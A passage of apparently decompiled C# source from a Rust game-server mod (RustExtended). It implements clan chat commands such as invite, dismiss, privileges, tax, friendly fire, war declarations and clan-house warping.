                                            string str9 = num6.ToString("N0") + Economy.CurrencySign;
                                            if (class3.userData_0.Clan.Balance < num6)
                                            {
                                                Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Withdraw.NoEnoughAmount", class3.userData_0.Clan, class3.netUser_0, null).Replace("%WITHDRAW_AMOUNT%", str9), 5f);
                                                return;
                                            }
                                            class3.userData_0.Clan.Balance -= num6;
                                            economy2.Balance += num6;
                                            Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Withdraw.Success", class3.userData_0.Clan, class3.netUser_0, null).Replace("%WITHDRAW_AMOUNT%", str9), 5f);
                                            Economy.Balance(class3.netUser_0, class3.userData_0, "balance", new string[0]);
                                            return;
                                        }
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Withdraw.NoAmount", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessage("Economy.NotAvailable", null, null), 5f);
                                    return;
                                }
                                Broadcast.MessageClan(class3.netUser_0, Config.GetMessageClan("Command.Clan.NoPermissions", null, class3.netUser_0, null));
                                return;
                            }
                            case "LEAVE":
                                if (class3.userData_0.Clan.LeaderID != class3.userData_0.SteamID)
                                {
                                    Broadcast.Notice(class3.netUser_0, "☢", Config.GetMessageClan("Command.Clan.Leave.Success", null, class3.netUser_0, null), 5f);
                                    Broadcast.MessageClan(class3.userData_0.Clan, Config.GetMessageClan("Command.Clan.Leave.MemberLeaved", class3.userData_0.Clan, NetUser.FindByUserID(class3.userData_0.SteamID), null));
                                    Clans.MemberLeave(class3.userData_0.Clan, class3.userData_0);
                                    return;
                                }
                                Broadcast.MessageClan(class3.netUser_0, Config.GetMessageClan("Command.Clan.Leave.DisbandBefore", null, class3.netUser_0, null));
                                return;

                            case "MEMBERS":
                                foreach (string str10 in Config.GetMessagesClan("Command.Clan.Members", class3.userData_0.Clan, class3.netUser_0, null))
                                {
                                    if (str10.Contains("%CLAN.MEMBERS_LIST%"))
                                    {
                                        string str11 = str10.Replace("%CLAN.MEMBERS_LIST%", "");
                                        foreach (UserData data8 in class3.userData_0.Clan.Members.Keys)
                                        {
                                            str11 = str11 + data8.Username + ", ";
                                            if (str11.Length > 80)
                                            {
                                                Broadcast.MessageClan(class3.netUser_0, class3.userData_0.Clan, str11.Substring(0, str11.Length - 2));
                                                str11 = "";
                                            }
                                        }
                                        if (str11.Length > 0)
                                        {
                                            Broadcast.MessageClan(class3.netUser_0, class3.userData_0.Clan, str11.Substring(0, str11.Length - 2));
                                        }
                                    }
                                    else if (!str10.Contains("%CLAN."))
                                    {
                                        Broadcast.MessageClan(class3.netUser_0, str10);
                                    }
                                }
                                return;

                            case "ONLINE":
                                foreach (string str12 in Config.GetMessagesClan("Command.Clan.Online", class3.userData_0.Clan, class3.netUser_0, null))
                                {
                                    if (str12.Contains("%CLAN.ONLINE_LIST%"))
                                    {
                                        string str13 = str12.Replace("%CLAN.ONLINE_LIST%", "");
                                        foreach (UserData data9 in class3.userData_0.Clan.Members.Keys)
                                        {
                                            if (NetUser.FindByUserID(data9.SteamID) != null)
                                            {
                                                str13 = str13 + data9.Username + ", ";
                                            }
                                            if (str13.Length > 80)
                                            {
                                                Broadcast.MessageClan(class3.netUser_0, class3.userData_0.Clan, str13.Substring(0, str13.Length - 2));
                                                str13 = "";
                                            }
                                        }
                                        if (str13.Length > 0)
                                        {
                                            Broadcast.MessageClan(class3.netUser_0, class3.userData_0.Clan, str13.Substring(0, str13.Length - 2));
                                        }
                                    }
                                    else if (!str12.Contains("%CLAN."))
                                    {
                                        Broadcast.MessageClan(class3.netUser_0, str12);
                                    }
                                }
                                return;

                            case "INVITE":
                                if (class3.userData_0.Clan.Members[class3.userData_0].Has<ClanMemberFlags>(ClanMemberFlags.invite))
                                {
                                    if (Args.Length < 2)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Invite.NoValue", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    if (class3.userData_0.Clan.Members.Count >= class3.userData_0.Clan.Level.MaxMembers)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Invite.NoSlots", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    dataUser = Users.Find(Args[1]);
                                    if (dataUser == null)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", class3.netUser_0, Args[1]), 5f);
                                        return;
                                    }
                                    if (dataUser.Clan != null)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Invite.AlreadyInClan", class3.userData_0.Clan, null, dataUser), 5f);
                                        return;
                                    }
                                    if (Core.ChatQuery.ContainsKey(dataUser.SteamID))
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Invite.AlreadyInvite", class3.userData_0.Clan, null, dataUser), 5f);
                                        return;
                                    }
                                    NetUser user3 = NetUser.FindByUserID(dataUser.SteamID);
                                    Broadcast.MessageClan(class3.netUser_0, Config.GetMessageClan("Command.Clan.Invite.InviteToJoin", class3.userData_0.Clan, null, dataUser));
                                    UserQuery query = new UserQuery(dataUser, Config.GetMessageClan("Command.Clan.Invite.JoinQuery", class3.userData_0.Clan, class3.netUser_0, null), 10) {
                                        Answer = { new UserAnswer("Y*", "RustExtended.Clans.MemberJoin", new object[] { class3.userData_0.Clan, dataUser }), new UserAnswer("Y*", "RustExtended.Broadcast.MessageClan", new object[] { class3.userData_0.Clan, Config.GetMessageClan("Command.Clan.Invite.JoinAnswerY", class3.userData_0.Clan, null, dataUser) }), new UserAnswer("*", "RustExtended.Broadcast.MessageClan", new object[] { class3.userData_0.Clan, Config.GetMessageClan("Command.Clan.Invite.JoinAnswerN", class3.userData_0.Clan, null, dataUser) }) }
                                    };
                                    Core.ChatQuery.Add(dataUser.SteamID, query);
                                    if (user3 != null)
                                    {
                                        Broadcast.Notice(user3, "?", query.Query, 5f);
                                    }
                                    return;
                                }
                                Broadcast.MessageClan(class3.netUser_0, Config.GetMessageClan("Command.Clan.NoPermissions", null, class3.netUser_0, null));
                                return;

                            case "DISMISS":
                                if (class3.userData_0.Clan.Members[class3.userData_0].Has<ClanMemberFlags>(ClanMemberFlags.dismiss))
                                {
                                    if (Args.Length < 2)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Dismiss.NoValue", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    dataUser = Users.Find(Args[1]);
                                    if (dataUser == null)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", class3.netUser_0, Args[1]), 5f);
                                        return;
                                    }
                                    if (class3.userData_0.Clan != dataUser.Clan)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Dismiss.NotInClan", class3.userData_0.Clan, class3.netUser_0, dataUser), 5f);
                                        return;
                                    }
                                    if (dataUser.Clan.LeaderID == dataUser.SteamID)
                                    {
                                        Broadcast.MessageClan(class3.netUser_0, Config.GetMessageClan("Command.Clan.Dismiss.IsLeader", class3.userData_0.Clan, class3.netUser_0, dataUser));
                                        return;
                                    }
                                    NetUser user4 = NetUser.FindByUserID(dataUser.SteamID);
                                    if (user4 != null)
                                    {
                                        Broadcast.Notice(user4, "☢", Config.GetMessageClan("Command.Clan.Dismiss.IsLeader", class3.userData_0.Clan, user4, null), 5f);
                                    }
                                    Broadcast.Notice(class3.netUser_0, "☢", Config.GetMessageClan("Command.Clan.Dismiss.ToDismiss", class3.userData_0.Clan, class3.netUser_0, dataUser), 5f);
                                    Clans.MemberLeave(class3.userData_0.Clan, dataUser);
                                    return;
                                }
                                Broadcast.MessageClan(class3.netUser_0, Config.GetMessageClan("Command.Clan.NoPermissions", null, class3.netUser_0, null));
                                return;

                            case "PRIV":
                                if (Args.Length >= 2)
                                {
                                    dataUser = Users.Find(Args[1]);
                                    if (dataUser == null)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", class3.netUser_0, Args[1]), 5f);
                                        return;
                                    }
                                    if (class3.userData_0.Clan != dataUser.Clan)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Privileges.NotInClan", class3.userData_0.Clan, class3.netUser_0, dataUser), 5f);
                                        return;
                                    }
                                    if (Args.Length < 3)
                                    {
                                        Broadcast.MessageClan(class3.netUser_0, Config.GetMessageClan("Command.Clan.Privileges.Member", class3.userData_0.Clan, class3.netUser_0, dataUser).Replace("%MEMBER_PRIV%", class3.userData_0.Clan.Members[dataUser].ToString()));
                                        return;
                                    }
                                    if (!class3.userData_0.Clan.Members[class3.userData_0].Has<ClanMemberFlags>(ClanMemberFlags.management))
                                    {
                                        Broadcast.MessageClan(class3.netUser_0, Config.GetMessageClan("Command.Clan.NoPermissions", null, class3.netUser_0, null));
                                        return;
                                    }
                                    if (dataUser.Clan.LeaderID == dataUser.SteamID)
                                    {
                                        Broadcast.MessageClan(class3.netUser_0, Config.GetMessageClan("Command.Clan.Privileges.NoCanChange", null, class3.netUser_0, null));
                                        return;
                                    }
                                    if (Args.Length > 2)
                                    {
                                        Args[2] = Args[2].ToUpper();
                                        if ((Args[2] != "NONE") && (Args[2] != "CLEAR"))
                                        {
                                            if ((Args[2] != "FULL") && (Args[2] != "ALL"))
                                            {
                                                Dictionary<UserData, ClanMemberFlags> dictionary;
                                                UserData data11;
                                                if (Args[2] != "INVITE")
                                                {
                                                    if (Args[2] != "DISMISS")
                                                    {
                                                        if (Args[2] != "MANAGEMENT")
                                                        {
                                                            Broadcast.Notice(class3.netUser_0, "✘", "Unknown name of privilege.", 5f);
                                                            return;
                                                        }
                                                        (dictionary = class3.userData_0.Clan.Members)[data11 = dataUser] = ((ClanMemberFlags) dictionary[data11]) ^ ClanMemberFlags.management;
                                                    }
                                                    else
                                                    {
                                                        (dictionary = class3.userData_0.Clan.Members)[data11 = dataUser] = ((ClanMemberFlags) dictionary[data11]) ^ ClanMemberFlags.dismiss;
                                                    }
                                                }
                                                else
                                                {
                                                    (dictionary = class3.userData_0.Clan.Members)[data11 = dataUser] = ((ClanMemberFlags) dictionary[data11]) ^ ClanMemberFlags.invite;
                                                }
                                            }
                                            else
                                            {
                                                class3.userData_0.Clan.Members[dataUser] = ClanMemberFlags.management | ClanMemberFlags.dismiss | ClanMemberFlags.invite;
                                            }
                                        }
                                        else
                                        {
                                            class3.userData_0.Clan.Members[dataUser] = 0;
                                        }
                                        Broadcast.MessageClan(class3.netUser_0, Config.GetMessageClan("Command.Clan.Privileges.Member", class3.userData_0.Clan, class3.netUser_0, dataUser).Replace("%MEMBER_PRIV%", class3.userData_0.Clan.Members[dataUser].ToString()));
                                    }
                                    return;
                                }
                                Broadcast.MessageClan(class3.netUser_0, Config.GetMessageClan("Command.Clan.Privileges", class3.userData_0.Clan, class3.netUser_0, dataUser).Replace("%MEMBER_PRIV%", class3.userData_0.Clan.Members[class3.userData_0].ToString()));
                                return;

                            case "DETAILS":
                                flag = class3.userData_0.Clan.Members[class3.userData_0].Has<ClanMemberFlags>(ClanMemberFlags.expdetails);
                                if (Args.Length <= 1)
                                {
                                    if (flag)
                                    {
                                        Broadcast.MessageClan(class3.netUser_0, Config.GetMessageClan("Command.Clan.Details.Enabled", class3.userData_0.Clan, class3.netUser_0, class3.userData_0));
                                        return;
                                    }
                                    Broadcast.MessageClan(class3.netUser_0, Config.GetMessageClan("Command.Clan.Details.Disabled", class3.userData_0.Clan, class3.netUser_0, class3.userData_0));
                                    return;
                                }
                                if (!(flag = Args[1].ToBool()))
                                {
                                    Broadcast.MessageClan(class3.netUser_0, Config.GetMessageClan("Command.Clan.Details.SetOff", class3.userData_0.Clan, class3.netUser_0, class3.userData_0));
                                    break;
                                }
                                Broadcast.MessageClan(class3.netUser_0, Config.GetMessageClan("Command.Clan.Details.SetOn", class3.userData_0.Clan, class3.netUser_0, class3.userData_0));
                                break;

                            case "ABBR":
                                if (class3.userData_0.Clan.Members[class3.userData_0].Has<ClanMemberFlags>(ClanMemberFlags.management))
                                {
                                    if (!class3.userData_0.Clan.Flags.Has<ClanFlags>(ClanFlags.can_abbr))
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Abbr.NoAvailable", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    if (Args.Length < 2)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Abbr.NoValue", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    if (Args[1].Length < 2)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Abbr.TooShortLength", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    if (Args[1].Length > 8)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Abbr.TooLongLength", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    if (!Regex.Match(Args[1], @"[^()<>{}\[\]]+", RegexOptions.IgnoreCase).Success)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Abbr.ForbiddenSyntax", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    class3.userData_0.Clan.Abbr = Args[1];
                                    Broadcast.MessageClan(class3.userData_0.Clan, Config.GetMessageClan("Command.Clan.Abbr.Success", class3.userData_0.Clan, class3.netUser_0, null));
                                    return;
                                }
                                Broadcast.MessageClan(class3.netUser_0, Config.GetMessageClan("Command.Clan.NoPermissions", null, class3.netUser_0, null));
                                return;

                            case "TAX":
                            {
                                uint tax = class3.userData_0.Clan.Tax;
                                if (class3.userData_0.Clan.Members[class3.userData_0].Has<ClanMemberFlags>(ClanMemberFlags.management))
                                {
                                    if (!class3.userData_0.Clan.Flags.Has<ClanFlags>(ClanFlags.can_tax))
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Tax.NoAvailable", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    if (Args.Length < 2)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Tax.NoValue", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    if (!uint.TryParse(Args[1], out tax))
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Tax.NoNumeric", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    if (tax > 90)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Tax.VeryHigh", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    class3.userData_0.Clan.Tax = tax;
                                    Broadcast.MessageClan(class3.userData_0.Clan, Config.GetMessageClan("Command.Clan.Tax.Success", class3.userData_0.Clan, class3.netUser_0, null));
                                    return;
                                }
                                Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.NoPermissions", null, class3.netUser_0, null), 5f);
                                return;
                            }
                            case "TRANSFER":
                                if (class3.userData_0.Clan.LeaderID == class3.userData_0.SteamID)
                                {
                                    if (Args.Length < 2)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Transfer.NoValue", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    dataUser = Users.Find(Args[1]);
                                    if (dataUser == null)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", class3.netUser_0, Args[1]), 5f);
                                        return;
                                    }
                                    if ((dataUser.Clan != null) && (dataUser.Clan == class3.userData_0.Clan))
                                    {
                                        NetUser user5 = NetUser.FindByUserID(dataUser.SteamID);
                                        Broadcast.MessageClan(class3.netUser_0, clan, Config.GetMessageClan("Command.Clan.Transfer.Query", clan, class3.netUser_0, dataUser));
                                        UserQuery query2 = new UserQuery(dataUser, Config.GetMessageClan("Command.Clan.Transfer.QueryMember", class3.userData_0.Clan, null, null), 10) {
                                            Answer = { new UserAnswer("ACCEPT", "RustExtended.Clans.TransferAccept", new object[] { class3.userData_0.Clan, dataUser }), new UserAnswer("*", "RustExtended.Clans.TransferDecline", new object[] { class3.userData_0.Clan, dataUser }) }
                                        };
                                        Core.ChatQuery.Add(dataUser.SteamID, query2);
                                        if (user5 != null)
                                        {
                                            Broadcast.Notice(user5, "?", query2.Query, 5f);
                                            return;
                                        }
                                        return;
                                    }
                                    Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Transfer.NotInClan", class3.userData_0.Clan, class3.netUser_0, dataUser), 5f);
                                    return;
                                }
                                Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.NoPermissions", null, class3.netUser_0, null), 5f);
                                return;

                            case "MOTD":
                                if (class3.userData_0.Clan.Members[class3.userData_0].Has<ClanMemberFlags>(ClanMemberFlags.management))
                                {
                                    if (!class3.userData_0.Clan.Flags.Has<ClanFlags>(ClanFlags.can_motd))
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Motd.NoAvailable", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    if (Args.Length < 2)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Motd.NoValue", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    class3.userData_0.Clan.MOTD = Args[1];
                                    Broadcast.MessageClan(class3.userData_0.Clan, Config.GetMessageClan("Command.Clan.Motd.Success", class3.userData_0.Clan, class3.netUser_0, null));
                                    return;
                                }
                                Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.NoPermissions", null, class3.netUser_0, null), 5f);
                                return;

                            case "FRIENDLYFIRE":
                            case "FFIRE":
                            case "FF":
                                if (Args.Length >= 2)
                                {
                                    if (!class3.userData_0.Clan.Members[class3.userData_0].Has<ClanMemberFlags>(ClanMemberFlags.management))
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.NoPermissions", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    if (!class3.userData_0.Clan.Flags.Has<ClanFlags>(ClanFlags.can_ffire))
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.FriendlyFire.NoAvailable", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    if (Args[1].Equals("YES", StringComparison.OrdinalIgnoreCase))
                                    {
                                        class3.userData_0.Clan.FrendlyFire = true;
                                    }
                                    else if (Args[1].Equals("ON", StringComparison.OrdinalIgnoreCase))
                                    {
                                        class3.userData_0.Clan.FrendlyFire = true;
                                    }
                                    else if (Args[1].Equals("Y", StringComparison.OrdinalIgnoreCase))
                                    {
                                        class3.userData_0.Clan.FrendlyFire = true;
                                    }
                                    else if (Args[1].Equals("1", StringComparison.OrdinalIgnoreCase))
                                    {
                                        class3.userData_0.Clan.FrendlyFire = true;
                                    }
                                    else if (Args[1].Equals("NO", StringComparison.OrdinalIgnoreCase))
                                    {
                                        class3.userData_0.Clan.FrendlyFire = false;
                                    }
                                    else if (Args[1].Equals("OFF", StringComparison.OrdinalIgnoreCase))
                                    {
                                        class3.userData_0.Clan.FrendlyFire = false;
                                    }
                                    else if (Args[1].Equals("N", StringComparison.OrdinalIgnoreCase))
                                    {
                                        class3.userData_0.Clan.FrendlyFire = false;
                                    }
                                    else
                                    {
                                        if (!Args[1].Equals("0", StringComparison.OrdinalIgnoreCase))
                                        {
                                            Broadcast.MessageClan(class3.netUser_0, Config.GetMessageClan("Command.Clan.FriendlyFire.Help", null, class3.netUser_0, null));
                                            return;
                                        }
                                        class3.userData_0.Clan.FrendlyFire = false;
                                    }
                                    if (class3.userData_0.Clan.FrendlyFire)
                                    {
                                        Broadcast.MessageClan(class3.netUser_0, Config.GetMessageClan("Command.Clan.FriendlyFire.ToEnable", class3.userData_0.Clan, class3.netUser_0, null));
                                        return;
                                    }
                                    Broadcast.MessageClan(class3.netUser_0, Config.GetMessageClan("Command.Clan.FriendlyFire.ToDisable", class3.userData_0.Clan, class3.netUser_0, null));
                                    return;
                                }
                                if (!class3.userData_0.Clan.FrendlyFire)
                                {
                                    Broadcast.MessageClan(class3.netUser_0, Config.GetMessageClan("Command.Clan.FriendlyFire.Disabled", class3.userData_0.Clan, class3.netUser_0, null));
                                    return;
                                }
                                Broadcast.MessageClan(class3.netUser_0, Config.GetMessageClan("Command.Clan.FriendlyFire.Enabled", class3.userData_0.Clan, class3.netUser_0, null));
                                return;

                            case "WAR":
                            case "HOSTILE":
                                if (class3.userData_0.Clan.Members[class3.userData_0].Has<ClanMemberFlags>(ClanMemberFlags.management))
                                {
                                    if (!class3.userData_0.Clan.Flags.Has<ClanFlags>(ClanFlags.can_declare))
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Hostile.NoAvailable", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    if (Args.Length < 2)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Hostile.NoValue", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    clan = Clans.Find(Args[1]);
                                    if (clan == null)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Hostile.NoClan", class3.userData_0.Clan, class3.netUser_0, null).Replace("%CLAN_NAME%", Args[1]), 5f);
                                        return;
                                    }
                                    userdata = Users.GetBySteamID(clan.LeaderID);
                                    if (userdata == null)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Hostile.NoLeader", class3.userData_0.Clan, class3.netUser_0, null).Replace("%CLAN_NAME%", clan.Name), 5f);
                                        return;
                                    }
                                    if ((class3.userData_0.Clan != clan) && clan.Flags.Has<ClanFlags>(ClanFlags.can_declare))
                                    {
                                        if ((class3.userData_0.Clan.Penalty > DateTime.Now) || (clan.Penalty > DateTime.Now))
                                        {
                                            Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Hostile.CannotWar", class3.userData_0.Clan, class3.netUser_0, null).Replace("%CLAN_NAME%", clan.Name), 5f);
                                            return;
                                        }
                                        if (class3.userData_0.Clan.Hostile.ContainsKey(clan.ID))
                                        {
                                            Broadcast.Notice(class3.netUser_0, "✔", Config.GetMessageClan("Command.Clan.Hostile.InWar", class3.userData_0.Clan, class3.netUser_0, null).Replace("%CLAN_NAME%", clan.Name), 5f);
                                            return;
                                        }
                                        if (Core.ChatQuery.ContainsKey(clan.LeaderID))
                                        {
                                            Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Hostile.Query.Busy", class3.userData_0.Clan, class3.netUser_0, null).Replace("%CLAN_NAME%", clan.Name), 5f);
                                            return;
                                        }
                                        foreach (string str14 in Config.GetMessagesClan("Command.Clan.Hostile.Declare", clan, class3.netUser_0, class3.userData_0))
                                        {
                                            if (!str14.Contains("%CLAN."))
                                            {
                                                Broadcast.MessageClan(class3.userData_0.Clan, str14);
                                            }
                                        }
                                        UserQuery query3 = new UserQuery(userdata, Config.GetMessageClan("Command.Clan.Hostile.Query", class3.userData_0.Clan, class3.netUser_0, null), 10) {
                                            Answer = { new UserAnswer("Y*", "RustExtended.Clans.AcceptsWar", new object[] { class3.userData_0.Clan, clan }), new UserAnswer("N*", "RustExtended.Clans.DeclineWar", new object[] { class3.userData_0.Clan, clan }) }
                                        };
                                        Core.ChatQuery.Add(clan.LeaderID, query3);
                                        NetUser user6 = NetUser.FindByUserID(clan.LeaderID);
                                        if (user6 != null)
                                        {
                                            Broadcast.MessageClan(clan, query3.Query);
                                            Broadcast.Notice(user6, "?", query3.Query, 5f);
                                            foreach (string str15 in Config.GetMessagesClan("Command.Clan.Hostile.Query.Comment", class3.userData_0.Clan, class3.netUser_0, null))
                                            {
                                                if (!str15.Contains("%CLAN."))
                                                {
                                                    Broadcast.MessageClan(clan, str15);
                                                }
                                            }
                                            return;
                                        }
                                        return;
                                    }
                                    Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Hostile.CannotWar", class3.userData_0.Clan, class3.netUser_0, null).Replace("%CLAN_NAME%", clan.Name), 5f);
                                    return;
                                }
                                Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.NoPermissions", null, class3.netUser_0, null), 5f);
                                return;

                            case "HOUSE":
                                if (class3.userData_0.Clan.Members[class3.userData_0].Has<ClanMemberFlags>(ClanMemberFlags.management))
                                {
                                    if (!class3.userData_0.Clan.Flags.Has<ClanFlags>(ClanFlags.can_warp))
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.House.NoAvailable", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    Vector3 position = class3.netUser_0.playerClient.controllable.character.transform.position;
                                    foreach (Collider collider in Physics.OverlapSphere(position, 1f))
                                    {
                                        IDBase component = collider.gameObject.GetComponent<IDBase>();
                                        if (((component != null) && (component.idMain is StructureMaster)) && ((component.idMain as StructureMaster).ownerID == class3.userData_0.SteamID))
                                        {
                                            class3.userData_0.Clan.Location = position;
                                            foreach (string str16 in Config.GetMessagesClan("Command.Clan.House.Success", class3.userData_0.Clan, class3.netUser_0, null))
                                            {
                                                if (!str16.Contains("%CLAN."))
                                                {
                                                    Broadcast.MessageClan(class3.userData_0.Clan, str16);
                                                }
                                            }
                                            return;
                                        }
                                    }
                                    Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.House.OnlyLeaderHouse", class3.userData_0.Clan, class3.netUser_0, null), 5f);
                                    return;
                                }
                                Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.NoPermissions", null, class3.netUser_0, null), 5f);
                                return;

                            case "WARP":
                                if (class3.userData_0.Clan.Flags.Has<ClanFlags>(ClanFlags.can_warp))
                                {
                                    if (class3.userData_0.Clan.Location == Vector3.zero)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Warp.NoClanHouse", class3.userData_0.Clan, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    if (Clans.WarpOutdoorsOnly)
                                    {
                                        foreach (Collider collider2 in Physics.OverlapSphere(class3.netUser_0.playerClient.controllable.character.transform.position, 1f, 0x10360401))
                                        {
                                            IDMain main = IDBase.GetMain(collider2);
                                            if (main != null)
                                            {
                                                StructureMaster master = main.GetComponent<StructureMaster>();
                                                if ((master != null) && (master.ownerID != class3.netUser_0.userID))
                                                {
                                                    UserData bySteamID = Users.GetBySteamID(master.ownerID);
                                                    if ((bySteamID == null) || !bySteamID.HasShared(class3.netUser_0.userID))
                                                    {
                                                        Broadcast.Notice(class3.netUser_0, "☢", Config.GetMessage("Command.Clan.Warp.NotHere", class3.netUser_0, null), 5f);
                                                        return;
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    if (match == null)
                                    {
                                        match = new Predicate<Countdown>(class3.method_1);
                                    }
                                    Countdown countdown = Users.CountdownList(class3.userData_0.SteamID).Find(match);
                                    if (countdown != null)
                                    {
                                        if (!countdown.Expired)
                                        {
                                            TimeSpan span = TimeSpan.FromSeconds(countdown.TimeLeft);
                                            Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessage("Command.Clan.Warp.Countdown", class3.netUser_0, null).Replace("%TIME%", string.Format("{0}:{1:D2}", span.Minutes, span.Seconds)), 5f);
                                            return;
                                        }
                                        Users.CountdownRemove(class3.userData_0.SteamID, countdown);
                                    }
                                    if (predicate2 == null)
                                    {
                                        predicate2 = new Predicate<EventTimer>(class3.method_2);
                                    }
                                    EventTimer timer = Events.Timer.Find(predicate2);
                                    if ((timer != null) && (timer.TimeLeft > 0.0))
                                    {
                                        Broadcast.Notice(class3.netUser_0, "☢", Config.GetMessage("Command.Clan.Warp.Timewait", class3.netUser_0, null).Replace("%SECONDS%", timer.TimeLeft.ToString()), 5f);
                                    }
                                    else if (class3.userData_0.Clan.Level.WarpTimewait <= 0)
                                    {
                                        timer = null;
                                        Events.Teleport_ClanWarp(null, class3.netUser_0, class3.string_0, class3.userData_0.Clan);
                                    }
                                    else
                                    {
                                        timer = Events.TimeEvent_ClanWarp(class3.netUser_0, class3.string_0, (double) class3.userData_0.Clan.Level.WarpTimewait, class3.userData_0.Clan);
                                        if ((timer != null) && (timer.TimeLeft > 0.0))
                                        {
                                            Broadcast.Notice(class3.netUser_0, "☢", Config.GetMessageClan("Command.Clan.Warp.Prepare", class3.userData_0.Clan, class3.netUser_0, null).Replace("%SECONDS%", timer.TimeLeft.ToString()), 5f);
                                        }
                                    }
                                    return;
                                }
                                Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Warp.NoAvailable", null, class3.netUser_0, null), 5f);
                                return;

                            default:
                                Broadcast.Notice(class3.netUser_0.networkPlayer, "✘", Config.GetMessageCommand("Command.InvalidSyntax", class3.string_0, class3.netUser_0), 5f);
                                return;
                        }
                        class3.userData_0.Clan.Members[class3.userData_0] = class3.userData_0.Clan.Members[class3.userData_0].SetFlag<ClanMemberFlags>(ClanMemberFlags.expdetails, flag);
                    }
                }
            }
        }

        public static void Clanlist(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            foreach (string str in Config.GetMessagesClan("Command.Clans.List", null, Sender, null))
            {
